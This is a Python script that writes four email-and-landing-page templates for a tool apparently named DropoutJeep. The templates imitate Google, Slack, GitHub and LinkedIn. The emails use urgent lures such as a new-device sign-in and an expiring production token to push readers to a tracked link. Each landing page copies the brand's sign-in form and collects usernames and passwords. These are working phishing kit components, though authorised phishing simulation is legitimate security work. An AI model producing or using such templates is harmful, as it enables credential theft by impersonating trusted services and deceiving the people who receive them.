import json
import pathlib

new_templates = [
    {
        "name": "Google Workspace Security Alert",
        "category": "google",
        "description": "Google Workspace / Gmail critical security alert & account recovery notice.",
        "tags": ["google", "gmail", "workspace", "security-alert"],
        "subject": "Security alert: New device signed in to your Google Account",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Alert</title>
</head>
<body style="margin:0; padding:0; background-color:#FFFFFF; font-family:Google Sans, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; color:#202124;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="padding:30px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:520px; border:1px solid #DADCE0; border-radius:8px; padding:32px 40px; box-sizing:border-box;">
          <tr>
            <td align="center" style="padding-bottom:20px;">
              <svg width="74" height="24" viewBox="0 0 74 24" fill="none">
                <path d="M9.24 10.9v3.08h7.45c-.3 1.93-2.22 5.65-7.45 5.65-4.49 0-8.15-3.71-8.15-8.3 0-4.58 3.66-8.29 8.15-8.29 2.56 0 4.27 1.09 5.25 2.02l2.44-2.35C15.38 1.45 12.56 0 9.24 0 4.14 0 0 4.17 0 9.33c0 5.16 4.14 9.33 9.24 9.33 5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z" fill="#4285F4"/>
                <path d="M23 18.66c-3.15 0-5.3-2.16-5.3-5.33 0-3.2 2.15-5.33 5.3-5.33s5.3 2.13 5.3 5.33c0 3.17-2.15 5.33-5.3 5.33zm0-8.21c-1.68 0-3.04 1.34-3.04 2.88 0 1.51 1.36 2.88 3.04 2.88s3.04-1.37 3.04-2.88c0-1.54-1.36-2.88-3.04-2.88z" fill="#EA4335"/>
                <path d="M34.8 18.66c-3.15 0-5.3-2.16-5.3-5.33 0-3.2 2.15-5.33 5.3-5.33s5.3 2.13 5.3 5.33c0 3.17-2.15 5.33-5.3 5.33zm0-8.21c-1.68 0-3.04 1.34-3.04 2.88 0 1.51 1.36 2.88 3.04 2.88s3.04-1.37 3.04-2.88c0-1.54-1.36-2.88-3.04-2.88z" fill="#FBBC05"/>
                <path d="M46.2 23.4c-2.83 0-4.66-1.23-5.37-2.73l2.67-1.11c.42.8 1.34 1.42 2.7 1.42 1.78 0 2.87-1.09 2.87-3.11v-.77h-.11c-.55.67-1.61 1.25-2.94 1.25-2.76 0-5.11-2.4-5.11-5.33 0-2.96 2.35-5.33 5.11-5.33 1.33 0 2.39.58 2.94 1.22h.11v-.95h3.04v10.59c0 3.84-2.28 5.85-5.91 5.85zm.25-12.95c-1.62 0-2.9 1.34-2.9 2.88 0 1.51 1.28 2.88 2.9 2.88 1.6 0 2.86-1.37 2.86-2.88 0-1.54-1.26-2.88-2.86-2.88z" fill="#4285F4"/>
                <path d="M53.5 1.5h3.19v17.16H53.5V1.5z" fill="#34A853"/>
                <path d="M62.2 18.66c-2.6 0-4.47-1.18-5.63-3.41l7.53-3.11-.25-.62c-.47-1.28-1.92-3.52-4.88-3.52-2.94 0-5.38 2.32-5.38 5.33 0 2.93 2.41 5.33 5.61 5.33 2.58 0 4.07-1.57 4.69-2.49l-2.52-1.68c-.68.98-1.6 1.57-2.48 1.57zm-.17-8.15c-.93 0-1.77.47-2.25 1.29l5.24 2.17c-.28-1.74-1.74-3.46-2.99-3.46z" fill="#EA4335"/>
              </svg>
            </td>
          </tr>
          <tr>
            <td align="center" style="padding-bottom:16px;">
              <h1 style="margin:0; font-size:22px; font-weight:400; color:#202124;">New device signed in to</h1>
              <p style="margin:4px 0 0 0; font-size:14px; font-weight:500; color:#5f6368;">user@company.com</p>
            </td>
          </tr>
          <tr>
            <td style="padding:16px 0; border-top:1px solid #E8EAED; border-bottom:1px solid #E8EAED;">
              <p style="margin:0 0 12px 0; font-size:14px; color:#3c4043; line-height:1.5;">Your Google Account was just signed in to from a new Linux device. You're getting this email to make sure it was you.</p>
              <table width="100%" style="font-size:13px; color:#5f6368; line-height:1.6;">
                <tr><td style="width:90px;">Device:</td><td style="color:#202124; font-weight:500;">Linux Workstation</td></tr>
                <tr><td>Location:</td><td style="color:#202124; font-weight:500;">Unknown Location</td></tr>
                <tr><td>Time:</td><td style="color:#202124; font-weight:500;">Just now</td></tr>
              </table>
            </td>
          </tr>
          <tr>
            <td align="center" style="padding-top:24px;">
              <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#1a73e8; color:#FFFFFF; font-size:14px; font-weight:500; text-decoration:none; padding:10px 24px; border-radius:4px;">Check activity &rarr;</a>
            </td>
          </tr>
          <tr>
            <td style="padding-top:28px; font-size:12px; color:#70757a; text-align:center;">
              <p style="margin:0 0 4px 0;">You can also see security activity at <a href="{{TRACK_LINK}}" style="color:#1a73e8; text-decoration:none;">myaccount.google.com/notifications</a></p>
              <p style="margin:0;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#70757a; text-decoration:underline;">Unsubscribe from security notifications</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background-color:#FFFFFF; font-family:'Google Sans', Roboto, Arial, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; color:#202124; }
  .card { background:#FFFFFF; width:100%; max-width:450px; padding:40px 40px 36px 40px; border:1px solid #DADCE0; border-radius:8px; text-align:center; }
  .logo { margin-bottom:16px; }
  h1 { font-size:24px; font-weight:400; margin:0 0 8px 0; }
  p.subtitle { font-size:16px; color:#202124; margin:0 0 32px 0; }
  .form-group { text-align:left; margin-bottom:24px; }
  .form-control { width:100%; padding:14px 16px; border:1px solid #DADCE0; border-radius:4px; font-size:16px; outline:none; transition:border-color 0.2s; }
  .form-control:focus { border-color:#1A73E8; box-shadow:0 0 0 2px rgba(26,115,232,0.2); }
  .btn-next { background:#1A73E8; color:white; border:none; padding:10px 24px; font-size:14px; font-weight:500; border-radius:4px; cursor:pointer; float:right; }
  .btn-next:hover { background:#1557B0; }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="74" height="24" viewBox="0 0 74 24" fill="none">
        <path d="M9.24 10.9v3.08h7.45c-.3 1.93-2.22 5.65-7.45 5.65-4.49 0-8.15-3.71-8.15-8.3 0-4.58 3.66-8.29 8.15-8.29 2.56 0 4.27 1.09 5.25 2.02l2.44-2.35C15.38 1.45 12.56 0 9.24 0 4.14 0 0 4.17 0 9.33c0 5.16 4.14 9.33 9.24 9.33 5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z" fill="#4285F4"/>
        <path d="M23 18.66c-3.15 0-5.3-2.16-5.3-5.33 0-3.2 2.15-5.33 5.3-5.33s5.3 2.13 5.3 5.33c0 3.17-2.15 5.33-5.3 5.33zm0-8.21c-1.68 0-3.04 1.34-3.04 2.88 0 1.51 1.36 2.88 3.04 2.88s3.04-1.37 3.04-2.88c0-1.54-1.36-2.88-3.04-2.88z" fill="#EA4335"/>
        <path d="M34.8 18.66c-3.15 0-5.3-2.16-5.3-5.33 0-3.2 2.15-5.33 5.3-5.33s5.3 2.13 5.3 5.33c0 3.17-2.15 5.33-5.3 5.33zm0-8.21c-1.68 0-3.04 1.34-3.04 2.88 0 1.51 1.36 2.88 3.04 2.88s3.04-1.37 3.04-2.88c0-1.54-1.36-2.88-3.04-2.88z" fill="#FBBC05"/>
        <path d="M46.2 23.4c-2.83 0-4.66-1.23-5.37-2.73l2.67-1.11c.42.8 1.34 1.42 2.7 1.42 1.78 0 2.87-1.09 2.87-3.11v-.77h-.11c-.55.67-1.61 1.25-2.94 1.25-2.76 0-5.11-2.4-5.11-5.33 0-2.96 2.35-5.33 5.11-5.33 1.33 0 2.39.58 2.94 1.22h.11v-.95h3.04v10.59c0 3.84-2.28 5.85-5.91 5.85zm.25-12.95c-1.62 0-2.9 1.34-2.9 2.88 0 1.51 1.28 2.88 2.9 2.88 1.6 0 2.86-1.37 2.86-2.88 0-1.54-1.26-2.88-2.86-2.88z" fill="#4285F4"/>
        <path d="M53.5 1.5h3.19v17.16H53.5V1.5z" fill="#34A853"/>
        <path d="M62.2 18.66c-2.6 0-4.47-1.18-5.63-3.41l7.53-3.11-.25-.62c-.47-1.28-1.92-3.52-4.88-3.52-2.94 0-5.38 2.32-5.38 5.33 0 2.93 2.41 5.33 5.61 5.33 2.58 0 4.07-1.57 4.69-2.49l-2.52-1.68c-.68.98-1.6 1.57-2.48 1.57zm-.17-8.15c-.93 0-1.77.47-2.25 1.29l5.24 2.17c-.28-1.74-1.74-3.46-2.99-3.46z" fill="#EA4335"/>
      </svg>
    </div>
    <h1>Sign in</h1>
    <p class="subtitle">to continue to Google Account</p>
    <form method="post">
      <input type="hidden" name="token" value="{{TOKEN}}">
      <div class="form-group">
        <input class="form-control" name="user" type="email" placeholder="Email or phone" required>
      </div>
      <div class="form-group">
        <input class="form-control" name="pass" type="password" placeholder="Enter your password" required>
      </div>
      <button type="submit" class="btn-next">Next</button>
    </form>
  </div>
</body>
</html>""",
        "filename": "google_workspace.json"
    },
    {
        "name": "Slack Workspace Invitation",
        "category": "slack",
        "description": "Slack enterprise workspace invitation & channel login notice.",
        "tags": ["slack", "workspace", "chat", "collaboration"],
        "subject": "You have been invited to join the Corporate Slack Workspace",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Slack Workspace Invitation</title>
</head>
<body style="margin:0; padding:0; background-color:#F4F4F4; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color:#1D1C1D;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:560px; background-color:#FFFFFF; border-radius:8px; border:1px solid #DDDDDD; overflow:hidden;">
          <tr>
            <td style="background-color:#4A154B; padding:24px 32px;">
              <span style="color:#FFFFFF; font-size:22px; font-weight:900; letter-spacing:-0.5px;">slack</span>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#1D1C1D; font-size:20px; font-weight:700;">Join your team on Slack</h2>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#616061;">The Systems Operations team invited you to collaborate in the corporate Slack workspace <strong>#ops-announcements</strong>.</p>
              
              <table role="presentation" width="100%" style="margin-bottom:28px;">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#611B64; color:#FFFFFF; font-size:15px; font-weight:700; text-decoration:none; padding:14px 36px; border-radius:4px;">Join Workspace Now &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F8F8F8; padding:20px 32px; border-top:1px solid #EEEEEE; text-align:center; font-size:12px; color:#616061;">
              <p style="margin:0 0 6px 0;">Slack Technologies, 500 Howard Street, San Francisco, CA 94105</p>
              <p style="margin:0;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#1264A3; text-decoration:underline;">Unsubscribe from Slack invitations</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In to Slack</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#FFFFFF; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; color:#1D1C1D; }
  .container { width:100%; max-width:440px; padding:20px; text-align:center; }
  .logo { font-size:32px; font-weight:900; color:#4A154B; margin-bottom:24px; }
  h1 { font-size:28px; font-weight:700; margin:0 0 8px 0; }
  p.subtitle { font-size:15px; color:#616061; margin:0 0 32px 0; }
  .form-group { text-align:left; margin-bottom:16px; }
  .form-group label { display:block; font-size:13px; font-weight:700; margin-bottom:6px; }
  .form-group input { width:100%; padding:12px; border:1px solid #868686; border-radius:4px; font-size:15px; outline:none; }
  .btn-slack { width:100%; background:#4A154B; color:white; border:none; padding:12px; font-size:15px; font-weight:700; border-radius:4px; cursor:pointer; margin-top:12px; }
  .btn-slack:hover { background:#3F123F; }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">slack</div>
    <h1>First, enter your email</h1>
    <p class="subtitle">We suggest using the email address you use at work.</p>
    <form method="post">
      <input type="hidden" name="token" value="{{TOKEN}}">
      <div class="form-group">
        <label>Work Email Address</label>
        <input name="user" type="email" placeholder="name@work-email.com" required>
      </div>
      <div class="form-group">
        <label>Workspace Password</label>
        <input name="pass" type="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn-slack">Sign In With Password &rarr;</button>
    </form>
  </div>
</body>
</html>""",
        "filename": "slack_invite.json"
    },
    {
        "name": "GitHub Personal Access Token Audit",
        "category": "github",
        "description": "GitHub Security Audit & Personal Access Token expiration notice.",
        "tags": ["github", "developer", "security", "token", "git"],
        "subject": "[GitHub] Security Audit: Personal access token expiration alert",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub Security Notice</title>
</head>
<body style="margin:0; padding:0; background-color:#F6F8FA; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; color:#24292F;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:540px; background-color:#FFFFFF; border:1px solid #D0D7DE; border-radius:6px; overflow:hidden;">
          <tr>
            <td style="padding:24px 32px 16px 32px; border-bottom:1px solid #D0D7DE; background-color:#24292F;">
              <svg height="32" viewBox="0 0 16 16" width="32" fill="#FFFFFF">
                <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/>
              </svg>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#24292F; font-size:18px; font-weight:600;">Personal Access Token Expiration Alert</h2>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.5; color:#57606A;">Hey @developer,</p>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.5; color:#57606A;">Your personal access token <strong>prod-deploy-key</strong> will expire in 2 days. Renew your token now to prevent service disruptions with automated CI/CD pipelines.</p>
              
              <table role="presentation" width="100%" style="margin-bottom:24px;">
                <tr>
                  <td>
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#2DA44E; color:#FFFFFF; font-size:14px; font-weight:600; text-decoration:none; padding:10px 20px; border-radius:6px;">Regenerate Token &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F6F8FA; padding:16px 32px; border-top:1px solid #D0D7DE; font-size:12px; color:#57606A;">
              <p style="margin:0;">GitHub, Inc. &bull; 88 Colin P Kelly Jr St, San Francisco, CA 94107</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to GitHub &middot; GitHub</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#0D1117; color:#C9D1D9; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; }
  .logo { margin-bottom:24px; }
  .card { background:#161B22; width:100%; max-width:340px; padding:20px; border:1px solid #30363D; border-radius:6px; }
  h1 { font-size:24px; font-weight:300; text-align:center; margin:0 0 16px 0; color:#F0F6FC; }
  .form-group { margin-bottom:16px; }
  .form-group label { display:block; font-size:14px; color:#F0F6FC; margin-bottom:8px; }
  .form-group input { width:100%; padding:6px 12px; background:#0D1117; border:1px solid #30363D; border-radius:6px; color:#F0F6FC; font-size:14px; outline:none; }
  .btn-github { width:100%; background:#238636; color:white; border:none; padding:8px 16px; font-size:14px; font-weight:500; border-radius:6px; cursor:pointer; margin-top:8px; }
  .btn-github:hover { background:#2EA043; }
</style>
</head>
<body>
  <div class="logo">
    <svg height="48" viewBox="0 0 16 16" width="48" fill="#F0F6FC">
      <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/>
    </svg>
  </div>
  <h1>Sign in to GitHub</h1>
  <div class="card">
    <form method="post">
      <input type="hidden" name="token" value="{{TOKEN}}">
      <div class="form-group">
        <label>Username or email address</label>
        <input name="user" type="text" required>
      </div>
      <div class="form-group">
        <label>Password</label>
        <input name="pass" type="password" required>
      </div>
      <button type="submit" class="btn-github">Sign in</button>
    </form>
  </div>
</body>
</html>""",
        "filename": "github_security.json"
    },
    {
        "name": "LinkedIn Professional Connection Notice",
        "category": "linkedin",
        "description": "LinkedIn professional connection & message notification.",
        "tags": ["linkedin", "social", "networking", "recruitment"],
        "subject": "You have 1 new pending connection request on LinkedIn",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn Connection Notice</title>
</head>
<body style="margin:0; padding:0; background-color:#F3F2EF; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#000000;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="padding:30px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:540px; background-color:#FFFFFF; border-radius:8px; border:1px solid #E0E0E0; overflow:hidden;">
          <tr>
            <td style="padding:20px 24px; border-bottom:1px solid #E0E0E0;">
              <span style="color:#0A66C2; font-size:24px; font-weight:800;">Linked<span style="background:#0A66C2; color:white; padding:1px 4px; border-radius:2px;">in</span></span>
            </td>
          </tr>
          <tr>
            <td style="padding:24px;">
              <h2 style="margin:0 0 12px 0; font-size:18px; font-weight:600; color:#000000;">1 new connection request</h2>
              <p style="margin:0 0 20px 0; font-size:14px; color:#666666;">A senior talent recruiter in your industry wants to connect with you on LinkedIn.</p>
              
              <table role="presentation" width="100%">
                <tr>
                  <td>
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#0A66C2; color:#FFFFFF; font-size:14px; font-weight:600; text-decoration:none; padding:10px 24px; border-radius:16px;">Accept Connection &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F3F2EF; padding:16px 24px; font-size:12px; color:#666666; text-align:center;">
              <p style="margin:0;">LinkedIn Corporation, 1000 W Maude Ave, Sunnyvale, CA 94085</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn Sign In</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#FFFFFF; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; }
  .logo { color:#0A66C2; font-size:32px; font-weight:800; margin-bottom:20px; }
  .card { background:#FFFFFF; width:100%; max-width:350px; padding:24px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.15); }
  h1 { font-size:28px; font-weight:600; margin:0 0 8px 0; }
  p.sub { font-size:14px; color:#666666; margin:0 0 20px 0; }
  .form-group { margin-bottom:16px; }
  .form-group input { width:100%; padding:14px; border:1px solid #00000099; border-radius:4px; font-size:16px; outline:none; }
  .btn-linkedin { width:100%; background:#0A66C2; color:white; border:none; padding:14px; font-size:16px; font-weight:600; border-radius:28px; cursor:pointer; }
</style>
</head>
<body>
  <div class="logo">Linked<span style="background:#0A66C2; color:white; padding:1px 4px; border-radius:2px;">in</span></div>
  <div class="card">
    <h1>Sign in</h1>
    <p class="sub">Stay updated on your professional world</p>
    <form method="post">
      <input type="hidden" name="token" value="{{TOKEN}}">
      <div class="form-group">
        <input name="user" type="text" placeholder="Email or Phone" required>
      </div>
      <div class="form-group">
        <input name="pass" type="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn-linkedin">Sign in</button>
    </form>
  </div>
</body>
</html>""",
        "filename": "linkedin_connect.json"
    }
]

out_dir = pathlib.Path("dropoutjeep_lib/data/templates")
for t in new_templates:
    fn = t.pop("filename")
    target_file = out_dir / fn
    target_file.write_text(json.dumps(t, indent=2), encoding="utf-8")
    print(f"Wrote new template: {fn}")
